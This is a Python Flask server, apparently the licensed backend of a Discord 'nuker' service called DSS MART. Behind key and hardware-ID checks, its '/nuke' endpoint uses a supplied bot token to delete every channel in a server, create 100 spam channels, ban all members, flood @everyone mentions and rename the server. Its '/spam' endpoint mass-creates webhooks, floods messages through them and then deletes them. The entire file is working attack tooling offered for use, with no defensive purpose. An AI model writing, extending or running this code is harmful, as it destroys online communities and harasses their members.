from flask import Flask, request, jsonify
import json, os, time, requests, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)
DB_FILE = "keys.json"

def load_db():
    if not os.path.exists(DB_FILE):
        return {"keys": {}}
    with open(DB_FILE, "r") as f:
        return json.load(f)

def verify_auth(data):
    key = data.get('key')
    hwid = data.get('hwid')
    db = load_db()
    if key not in db["keys"]: return False
    if db["keys"][key]["hwid"] != hwid: return False
    if not db["keys"][key]["active"]: return False
    if db["keys"][key]["expiry"] < time.time(): return False
    return True

@app.route('/verify', methods=['POST'])
def verify():
    data = request.json
    if verify_auth(data):
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Invalid key"}), 403

# ==================== NUKE ALL - SUPER FAST ====================
@app.route('/nuke', methods=['POST'])
def nuke():
    data = request.json
    if not verify_auth(data):
        return jsonify({"status": "error", "message": "Unauthorized"}), 403
    
    bot_token = data.get('bot_token')
    guild_id = data.get('guild_id')
    channel_name = data.get('channel_name', 'nuked')
    server_name = data.get('server_name', 'NUKED')
    everyone_msg = data.get('everyone_msg', '@everyone NUKED')
    
    headers = {"authorization": f"Bot {bot_token}", "content-type": "application/json"}
    stats = {"channels_deleted": 0, "channels_created": 0, "members_banned": 0, "mentioned": 0}
    
    try:
        # ===== STEP 1: DELETE ALL CHANNELS =====
        try:
            chans = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, timeout=5).json()
            chans = chans if isinstance(chans, list) else []
            with ThreadPoolExecutor(max_workers=150) as ex:
                futures = [ex.submit(requests.delete, f"https://discord.com/api/v9/channels/{c['id']}", headers=headers, timeout=3) for c in chans]
                for f in as_completed(futures):
                    try: f.result()
                    except: pass
            stats["channels_deleted"] = len(chans)
        except: pass
        
        # ===== STEP 2: CREATE 100 CHANNELS =====
        new_channels = []
        def create_ch(i):
            try:
                r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                                  headers=headers, json={"name": f"{channel_name}-{i}", "type": 0}, timeout=3)
                if r.status_code == 201:
                    return r.json().get('id')
            except: pass
            return None
        
        with ThreadPoolExecutor(max_workers=150) as ex:
            futures = [ex.submit(create_ch, i) for i in range(100)]
            for f in as_completed(futures):
                try:
                    cid = f.result()
                    if cid: new_channels.append(cid)
                except: pass
        stats["channels_created"] = len(new_channels)
        
        # ===== STEP 3: BAN ALL MEMBERS =====
        try:
            members = []
            after = 0
            while True:
                r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000&after={after}", headers=headers, timeout=5)
                if r.status_code != 200: break
                d = r.json()
                if not d or not isinstance(d, list): break
                members.extend(d)
                after = d[-1]['user']['id']
                if len(d) < 1000: break
            
            def ban_member(uid):
                try:
                    requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{uid}",
                                 headers=headers, json={"delete_message_seconds": 604800}, timeout=3)
                except: pass
            
            with ThreadPoolExecutor(max_workers=150) as ex:
                futures = [ex.submit(ban_member, m['user']['id']) for m in members]
                for f in as_completed(futures):
                    try: f.result()
                    except: pass
            stats["members_banned"] = len(members)
        except: pass
        
        # ===== STEP 4: EVERYONE MENTION SPAM =====
        try:
            def mention_channel(cid):
                for _ in range(5):
                    try:
                        requests.post(f"https://discord.com/api/v9/channels/{cid}/messages",
                                      headers=headers, json={"content": everyone_msg}, timeout=3)
                    except: pass
            
            with ThreadPoolExecutor(max_workers=80) as ex:
                futures = [ex.submit(mention_channel, cid) for cid in new_channels]
                for f in as_completed(futures):
                    try: f.result()
                    except: pass
            stats["mentioned"] = len(new_channels) * 5
        except: pass
        
        # ===== STEP 5: RENAME SERVER (LAST) =====
        try:
            requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}",
                           headers=headers, json={"name": server_name}, timeout=3)
        except: pass
        
        return jsonify({"status": "success", "stats": stats})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


# ==================== GUILD-WIDE WEBHOOK SPAM ====================
@app.route('/spam', methods=['POST'])
def spam():
    data = request.json
    if not verify_auth(data):
        return jsonify({"status": "error", "message": "Unauthorized"}), 403
    
    bot_token = data.get('bot_token')
    guild_id = data.get('guild_id')
    message = data.get('message', '@everyone NUKED')
    amount = int(data.get('amount', 1000))
    webhook_count = min(int(data.get('webhook_count', 8)), 15)
    
    headers = {"authorization": f"Bot {bot_token}", "content-type": "application/json"}
    start_time = time.time()
    
    try:
        # ===== STEP 1: GET ALL TEXT CHANNELS IN GUILD =====
        all_chans = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, timeout=5).json()
        text_channels = [c for c in all_chans if isinstance(c, dict) and c.get('type') == 0]
        
        if not text_channels:
            return jsonify({"status": "error", "message": "No text channels found"}), 400
        
        # ===== STEP 2: CREATE WEBHOOKS IN ALL CHANNELS (PARALLEL) =====
        all_webhooks = []
        lock = threading.Lock()
        
        def create_webhooks_for_channel(chan_id):
            local_whs = []
            def make_wh(i):
                try:
                    r = requests.post(f"https://discord.com/api/v9/channels/{chan_id}/webhooks",
                                      headers=headers, json={"name": f"DSS-{i}"}, timeout=5)
                    if r.status_code == 200:
                        wh = r.json()
                        return f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
                except: pass
                return None
            with ThreadPoolExecutor(max_workers=10) as ex:
                futures = [ex.submit(make_wh, i) for i in range(webhook_count)]
                for f in as_completed(futures):
                    try:
                        url = f.result()
                        if url: local_whs.append(url)
                    except: pass
            with lock:
                all_webhooks.extend(local_whs)
        
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(create_webhooks_for_channel, c['id']) for c in text_channels]
            for f in as_completed(futures):
                try: f.result()
                except: pass
        
        if not all_webhooks:
            return jsonify({"status": "error", "message": "No webhooks created"}), 500
        
        # ===== STEP 3: SPAM VIA ALL WEBHOOKS (PARALLEL) =====
        messages_per_wh = max(1, amount // len(all_webhooks))
        sent = [0]
        sent_lock = threading.Lock()
        
        def spam_webhook(wh_url):
            local_sent = 0
            for _ in range(messages_per_wh):
                try:
                    r = requests.post(wh_url, json={"content": message}, timeout=3)
                    if r.status_code in [200, 204]:
                        local_sent += 1
                except: pass
            with sent_lock:
                sent[0] += local_sent
        
        with ThreadPoolExecutor(max_workers=min(len(all_webhooks), 100)) as ex:
            futures = [ex.submit(spam_webhook, url) for url in all_webhooks]
            for f in as_completed(futures):
                try: f.result()
                except: pass
        
        # ===== STEP 4: DELETE ALL WEBHOOKS (CLEANUP) =====
        def delete_webhook(wh_url):
            try:
                requests.delete(wh_url, timeout=3)
            except: pass
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = [ex.submit(delete_webhook, url) for url in all_webhooks]
            for f in as_completed(futures):
                try: f.result()
                except: pass
        
        elapsed = round(time.time() - start_time, 2)
        
        return jsonify({
            "status": "success",
            "sent": sent[0],
            "channels_used": len(text_channels),
            "webhooks_created": len(all_webhooks),
            "time_taken": elapsed
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/')
def home():
    return "DSS MART Server - Online"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), threaded=True)
